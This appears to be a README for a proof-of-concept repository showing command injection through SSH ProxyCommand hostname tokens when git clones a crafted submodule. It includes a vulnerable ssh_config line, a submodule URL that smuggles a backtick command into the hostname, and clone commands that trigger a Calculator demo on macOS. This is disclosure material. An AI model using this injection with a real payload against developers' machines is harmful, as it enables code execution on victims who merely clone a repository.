## RCE via insecure `~/.ssh/config`

Use of tokens like %h, %p in `ProxyCommand` is quite popular to use tunnels and connection proxying using SSH.

### Vulnerable config

```
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.168.2.123:8087 %h %p
```

Note: in my initial assessment I was under the impression that using '%h` (single quotes) would avoid this, but looks like that is still going to be vulnerable with something like:

```
url = ssh://'`open -aCalculator`'foo.example.com/bar
```

Taken from: https://man.openbsd.org/ssh_config#ProxyCommand

### What is in this repository

A submodule which would exploit this vulnerability to pop a calculator on OSX.

Try it out using:

`git clone https://github.com/DioLin/poc-proxycommand-vulnerable --recurse-submodules`

or

`git clone git@github.com:DioLin/poc-proxycommand-vulnerable.git --recurse-submodules`
